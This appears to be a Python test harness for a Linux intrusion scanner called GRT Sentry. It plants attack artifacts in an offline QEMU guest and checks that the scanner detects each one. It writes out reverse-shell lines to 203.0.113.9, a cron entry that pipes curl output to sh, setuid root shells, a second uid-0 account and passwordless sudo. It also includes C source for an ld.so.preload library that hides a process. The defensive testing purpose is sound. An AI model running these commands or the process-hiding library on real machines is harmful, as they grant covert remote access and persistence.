#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""Does GRT Sentry find what was planted, and nothing on a clean machine?

    ./scripts/test-planted.py <live-iso> <grt-sentry.deb>

Boots a Debian live image under QEMU with no network, installs the package,
and scans twice as the live user and twice as root on the untouched system:
the second scans must raise no alarm. Then it plants one sample of each thing
Sentry looks for, scans again both ways, and checks every sample was named.
A last root scan, with the automatic response on, must call none of it new and
must block the address that keeps failing to log in.

The samples are synthetic: EICAR built from its bytes, a few lines of shell,
copies of system programs with bits set, a test library that hides one
process from directory reads. Nothing that does harm runs, and the guest has
no network to do it with.
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

TIMEOUT = 1500

# A test library loaded through ld.so.preload, which removes one process
# from every listing of /proc, the way the commonest Linux rootkits hide.
HIDER = r"""
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
static int hidden(struct dirent *d) {
    char path[300], name[64] = {0};
    if (d->d_name[0] < '0' || d->d_name[0] > '9') return 0;
    snprintf(path, sizeof path, "/proc/%s/comm", d->d_name);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (!fgets(name, sizeof name, f)) name[0] = 0;
    fclose(f);
    return strncmp(name, "grt-hidden", 10) == 0;
}
#define HOOK(fn, type) \
    type *fn(DIR *dir) { \
        static type *(*real)(DIR *); \
        if (!real) real = dlsym(RTLD_NEXT, #fn); \
        type *d; \
        while ((d = real(dir)) && hidden((struct dirent *)d)) {} \
        return d; \
    }
HOOK(readdir, struct dirent)
HOOK(readdir64, struct dirent64)
"""

EICAR_REVERSED = r"*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X"

GUEST = r"""
S=/dev/ttyS0
say() { echo "$@" >$S; }
systemctl start live-config.service >/dev/null 2>&1
for i in $(seq 1 40); do id grt >/dev/null 2>&1 && break; sleep 3; done
mkdir -p /run/p && tar -C /run/p -xf /dev/vda
apt-get update -o Dir::Etc::sourcelist=/etc/apt/sources.list.d/grt-local.list -o Dir::Etc::sourceparts=/dev/null -o APT::Get::List-Cleanup=0 >/dev/null 2>&1
apt-get install --no-install-recommends -y /run/p/grt-sentry.deb >/tmp/install.log 2>&1
say "GRT-INSTALL-RC=$?"
say "GRT-AA $(grep '^grt-sentry' /sys/kernel/security/apparmor/profiles)"
dmesg -C

scan() {  # who label
  if [ "$1" = root ]; then out=$(cd /root && HOME=/root grt-sentry --scan --quiet 2>&1); else out=$(su grt -c 'cd; grt-sentry --scan --quiet' 2>&1); fi
  echo "$out" | sed "s/^/GRT-$2 /" >$S
}
scan grt USER-CLEAN-1 >/dev/null; scan grt USER-CLEAN-2
scan root ROOT-CLEAN-1 >/dev/null; scan root ROOT-CLEAN-2

# --- planting ---
H=/home/grt
mkdir -p $H/Downloads $H/.config/grt-sentry/rules $H/.mozilla/firefox/t.default
cp /run/p/eicar.com $H/Downloads/eicar.com
cd /run/p && python3 -c "import zipfile;z=zipfile.ZipFile('$H/Downloads/parcel.zip','w');z.write('eicar.com','docs/eicar.com');z.close()"
python3 -c "import zipfile;z=zipfile.ZipFile('$H/Downloads/bomb.zip','w',zipfile.ZIP_DEFLATED);z.writestr('zeros.bin',b'\0'*(200<<20));z.close()"
printf '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > $H/Downloads/update.sh
printf 'dropper' > $H/Downloads/dropper.bin
echo "$(sha256sum $H/Downloads/dropper.bin | cut -d' ' -f1) planted dropper" > $H/.config/grt-sentry/indicators.txt
echo 'rule planted_marker { meta: title = "Planted marker" strings: $a = "GRT-PLANTED-MARKER" condition: $a }' > $H/.config/grt-sentry/rules/mine.yar
printf 'GRT-PLANTED-MARKER\n' > $H/Downloads/marker.sh
cp /run/p/extensions.json $H/.mozilla/firefox/t.default/extensions.json
printf '[General]\nStartWithLastProfile=1\n[Profile0]\nName=t\nPath=t.default\n' > $H/.mozilla/firefox/profiles.ini
echo 'bash -i >& /dev/tcp/203.0.113.9/443 0>&1 &' >> $H/.bashrc
chown -R grt:grt $H
cp /bin/true /usr/bin/whoami
cp /bin/id /usr/bin/.syslogd
cp /bin/bash /tmp/.rs && chmod 4755 /tmp/.rs
chmod u+s /usr/bin/find
printf '* * * * * root curl -s http://203.0.113.9/x | sh\n' > /etc/cron.d/update-check
printf '[Unit]\nDescription=x\n[Service]\nExecStart=/dev/shm/.k\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/grt-planted.service
systemctl enable grt-planted.service >/dev/null 2>&1
say "GRT-ENABLED $(systemctl is-enabled grt-planted.service 2>&1)"
echo dummy > /etc/modules-load.d/grt-planted.conf
useradd -o -u 0 -g 0 -M -s /bin/bash toor
useradd -m -s /bin/bash support
echo 'support ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-support && chmod 440 /etc/sudoers.d/99-support
chmod o+w /usr/local/bin
cp /bin/sleep /dev/shm/.k && su grt -c 'setsid /dev/shm/.k 900 >/dev/null 2>&1 &'
cp /bin/sleep /tmp/gone && su grt -c 'setsid /tmp/gone 900 >/dev/null 2>&1 &' && sleep 1 && rm /tmp/gone
for i in $(seq 1 12); do logger -p auth.info -t sshd "Failed password for root from 203.0.113.7 port 22 ssh2"; done
logger -p authpriv.notice -t sudo "support : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash"
cp /run/p/hider.so /usr/lib/x86_64-linux-gnu/libgrt-hider.so && echo /usr/lib/x86_64-linux-gnu/libgrt-hider.so > /etc/ld.so.preload
cp /bin/sleep /tmp/grt-hidden && /tmp/grt-hidden 900 & sleep 1
say "GRT-HIDER $(ls /proc | grep -c '^[0-9]') listed, ps sees $(ps -e | grep -c grt-hidden) grt-hidden"

scan grt USER-PLANTED
scan root ROOT-PLANTED

# --- 0.4: the same things again are not news, and the automatic response ---
bash /run/p/setup-nftables.sh >/dev/null 2>&1; say "GRT-NFT-SETUP $?"
for i in $(seq 1 12); do logger -p auth.info -t sshd "Failed password for root from 185.220.101.7 port 22 ssh2"; done
sed -i 's/^auto_block = false/auto_block = true/' /root/.config/grt-sentry/config.toml
scan root ROOT-AGAIN
say "GRT-AUTOBLOCK $(nft list set inet grtsentry autoblock 2>&1 | tr '\n' ' ')"
(cd /root && HOME=/root grt-sentry --report) | grep -A3 'automatic block did not work' | sed 's/^/GRT-WHY /' >$S
say "GRT-COMPARE $(cd /root && HOME=/root grt-sentry --compare 2>&1 | sed -n 3p)"
dmesg | grep 'apparmor="DENIED"' | grep grt-sentry | sed -E 's/.*operation="([^"]*)".*name="([^"]*)".*requested_mask="([^"]*)".*/\1 \2 \3/' | sort | uniq -c | sed 's/^ */GRT-DENIED /' >$S
say GRT-DONE
"""

EXTENSIONS = """{"addons":[{"id":"helper@deals.example","type":"extension","location":"app-system-share",
"signedState":2,"defaultLocale":{"name":"Deal Finder"},"userPermissions":{"origins":["<all_urls>"]}}]}"""

# What each planted sample must be named as, by the user's scan, the root
# scan, or either. A sample only root can see is marked so.
EXPECTED = [
    ("EICAR on its own", "either", "Antivirus test file (EICAR)"),
    ("EICAR in a zip", "either", "Antivirus test file (EICAR), inside the archive"),
    ("zip bomb", "either", "Possible decompression bomb"),
    ("reverse shell script", "either", "Reverse shell"),
    ("indicator hash", "user", "Matches one of your indicators"),
    ("own YARA rule", "user", "Planted marker"),
    ("sideloaded extension", "user", "Firefox extension from outside the store: Deal Finder"),
    ("line in .bashrc", "user", "New startup entry: A line in /home/grt/.bashrc"),
    ("replaced system binary", "either", "System program differs from its package: /usr/bin/whoami"),
    ("unpackaged program", "either", "A program no package installed: /usr/bin/.syslogd"),
    ("set-user-ID shell in /tmp", "either", "A program that runs as root, in a folder anyone can write: /tmp/.rs"),
    ("set-user-ID find", "either", "/usr/bin/find gives root to anyone who runs it"),
    ("cron job", "either", "New startup entry: Scheduled in /etc/cron.d/update-check"),
    ("enabled service", "either", "New startup entry: grt-planted.service"),
    ("boot module", "either", "New startup entry: Kernel module dummy"),
    ("second root account", "either", "A second root account: toor"),
    ("new account", "either", "New account that can log in: support"),
    ("sudo without password", "root", "support becomes root without a password"),
    ("writable PATH folder", "either", "Anyone can put programs in /usr/local/bin"),
    ("process from /dev/shm", "either", "runs from a temporary folder"),
    ("process from a deleted file", "either", "runs from a file that no longer exists"),
    ("failed logins", "either", "failed login attempts from 203.0.113.7"),
    ("new sudo user", "either", "support used sudo for the first time"),
    ("preload library", "either", "A library is being forced into every program that starts"),
    ("hidden process", "either", "A process is hiding: grt-hidden"),
]


def iso_file(iso: Path, inside: str) -> bytes:
    return subprocess.run(["isoinfo", "-R", "-i", str(iso), "-x", inside], capture_output=True, check=True).stdout


# The live image installs its own installer outside the package manager, which
# the folder check rightly reports. Both are facts about the image, not false
# alarms, and are listed here so the clean count measures Sentry.
# A Debian live session also gives its user sudo without a password, by design.
KNOWN_ON_IMAGE = ["A program no package installed: /usr/bin/grt-installer-", "grt becomes root without a password"]


def alarms(text: str, label: str) -> list[str]:
    return [l.split(" ", 1)[1].strip() for l in text.splitlines()
            if l.startswith(f"GRT-{label} ") and re.match(r"GRT-\S+ +(!!|!) ", l)
            and not any(k in l for k in KNOWN_ON_IMAGE)]


def titles(text: str, label: str) -> list[str]:
    return [l.split(" ", 1)[1].strip(" !") for l in text.splitlines() if l.startswith(f"GRT-{label} ")]


def main():
    if len(sys.argv) != 3:
        raise SystemExit(__doc__.split("\n\n")[1])
    iso, deb = Path(sys.argv[1]).resolve(), Path(sys.argv[2]).resolve()
    root = Path(__file__).resolve().parent.parent
    out = root / "src-tauri" / "target" / "planted"
    out.mkdir(parents=True, exist_ok=True)
    work = Path(tempfile.mkdtemp(prefix="work-", dir=out))

    try:
        (work / "vmlinuz").write_bytes(iso_file(iso, "/live/vmlinuz"))
        (work / "initrd.img").write_bytes(iso_file(iso, "/live/initrd.img"))
        grub = iso_file(iso, "/boot/grub/grub.cfg").decode(errors="replace")
        line = re.search(r"(boot=live[^\n]*)", grub)
        if not line:
            raise SystemExit("no kernel command line in the image")
        append = re.sub(r"findiso=\S*", "", line.group(1)).strip()

        payload = work / "payload"
        payload.mkdir()
        (payload / "guest.sh").write_text(GUEST)
        (payload / "eicar.com").write_text(EICAR_REVERSED[::-1])
        (payload / "extensions.json").write_text(EXTENSIONS)
        shutil.copy(deb, payload / "grt-sentry.deb")
        shutil.copy(root / "scripts" / "setup-nftables.sh", payload / "setup-nftables.sh")
        (work / "hider.c").write_text(HIDER)
        subprocess.run(["gcc", "-shared", "-fPIC", "-O2", "-o", str(payload / "hider.so"), str(work / "hider.c"), "-ldl"],
                       check=True)
        tar = work / "payload.tar"
        subprocess.run(["tar", "-C", str(payload), "-cf", str(tar), "."], check=True)

        boot = ("for i in 1 2 3 4 5 6 7 8 9 10; do [ -b /dev/vda ] && break; sleep 1; done; "
                "tar -xOf /dev/vda ./guest.sh | sh")
        accel = ["-accel", "kvm", "-cpu", "host"] if os.access("/dev/kvm", os.R_OK | os.W_OK) else []
        serial = work / "serial.log"
        cmd = ["qemu-system-x86_64", "-machine", "q35", "-m", "3072", "-smp", "2", *accel,
               "-kernel", str(work / "vmlinuz"), "-initrd", str(work / "initrd.img"),
               "-append", f"{append} console=ttyS0,115200 systemd.run=\"/bin/sh -c '{boot}'\"",
               "-drive", f"file={iso},media=cdrom,readonly=on",
               "-drive", f"file={tar},format=raw,if=virtio,readonly=on",
               "-nic", "none", "-display", "none", "-serial", f"file:{serial}", "-no-reboot"]
        vm = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"booting {iso.name}{' with KVM' if accel else ''}")

        start, text = time.time(), ""
        while time.time() - start < TIMEOUT:
            time.sleep(5)
            text = serial.read_text(errors="replace") if serial.exists() else ""
            if "GRT-DONE" in text or vm.poll() is not None:
                break
        vm.terminate()
        try:
            vm.wait(timeout=20)
        except subprocess.TimeoutExpired:
            vm.kill()
        (out / "serial.log").write_text(text)
    finally:
        shutil.rmtree(work, ignore_errors=True)

    if "GRT-DONE" not in text:
        raise SystemExit(f"the guest did not finish; see {out / 'serial.log'}")

    ok = True
    rc = re.search(r"GRT-INSTALL-RC=(\d+)", text)
    print(f"install: {'ok' if rc and rc.group(1) == '0' else 'FAILED'}")
    ok &= bool(rc and rc.group(1) == "0")
    profile = re.search(r"GRT-AA (.*)", text)
    print(f"profile: {profile.group(1).strip() if profile else 'not loaded'}")

    for label in ("USER-CLEAN-2", "ROOT-CLEAN-2"):
        found = alarms(text, label)
        print(f"clean machine, {label.split('-')[0].lower()} scan: {len(found)} alarms")
        for a in found:
            print(f"   {a}")
        ok &= not found

    user, admin = titles(text, "USER-PLANTED"), titles(text, "ROOT-PLANTED")
    missed = 0
    for name, who, wanted in EXPECTED:
        in_user = any(wanted in t for t in user)
        in_root = any(wanted in t for t in admin)
        seen = {"user": in_user, "root": in_root, "either": in_user or in_root}[who]
        where = "+".join(w for w, s in (("user", in_user), ("root", in_root)) if s) or "-"
        print(f"   {'found ' if seen else 'MISSED'} {name:30} ({where})")
        missed += not seen
    print(f"planted: {len(EXPECTED) - missed} of {len(EXPECTED)} found")
    ok &= missed == 0

    # Everything planted is still there in the second root scan, and none of
    # it may be announced as new: that is what the history is for.
    again = alarms(text, "ROOT-AGAIN")
    renewed = [a for a in again if a.endswith("(new)")]
    print(f"second planted scan: {len(again)} alarms, {len(renewed)} announced as new")
    for a in renewed:
        print(f"   {a}")
    ok &= bool(again) and not renewed

    setup = re.search(r"GRT-NFT-SETUP (\d+)", text)
    blocked = re.search(r"GRT-AUTOBLOCK (.*)", text)
    noted = any("failed login attempts from 185.220.101.7, blocked" in t for t in titles(text, "ROOT-AGAIN"))
    auto_ok = bool(setup and setup.group(1) == "0" and blocked and "185.220.101.7" in blocked.group(1) and noted)
    print(f"automatic block as root: {'ok' if auto_ok else 'FAILED'}")
    if not auto_ok and blocked:
        print(f"   {blocked.group(1).strip()[:300]}")
    for why in re.findall(r"GRT-WHY (.*)", text):
        print(f"   {why.strip()}")
    ok &= auto_ok

    compare = re.search(r"GRT-COMPARE (.*)", text)
    print(f"--compare: {compare.group(1).strip() if compare else 'nothing'}")
    ok &= bool(compare and " appeared, " in compare.group(1))

    denied = re.findall(r"GRT-DENIED (.*)", text)
    print(f"AppArmor denials for grt-sentry: {len(denied)}")
    for d in denied:
        print(f"   {d}")
    print(f"serial log: {out / 'serial.log'}")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
